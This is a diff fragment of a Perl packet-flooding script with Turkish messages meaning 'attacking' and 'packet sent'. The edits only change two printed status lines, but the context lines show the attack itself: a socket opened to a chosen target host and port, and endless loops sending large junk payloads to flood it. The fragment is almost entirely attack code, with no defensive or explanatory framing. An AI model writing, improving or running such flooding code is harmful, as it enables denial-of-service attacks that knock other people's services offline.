@@ -78,7 +78,7 @@ while (1) {
         Proto => "$proto" ) || die "\n[!] Bağlantı başarısız hedef[$host] port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
         for($i=0; $i<=500; $i++){
             $size = rand() * 8921873 * 99919988;
-            print ("saldırılıyor: (=>$host:$port~$proto<=) Packet yollandı: $size\n");
+            print ("Saldırılıyor: (=>$host:$port~$proto<=) Packet yollandı: $size\n");
             send($sock, $size*2, $size*2); 
             send($sock, $size*3, $size*3);
             send($sock, $size*4, $size*4);
@@ -88,7 +88,7 @@ while (1) {
 
   }else{
             $size = rand() * 8921873 * 99919988;
-            print ("Flooding: (=>$host:$port~$proto<=) Packet yollandı: $size\n");
+            print ("Saldırılıyor: (=>$host:$port~$proto<=) Packet yollandı: $size\n");
             send($sock, $size*2, $size*2); 
             send($sock, $size*3, $size*3);
             send($sock, $size*4, $size*4);
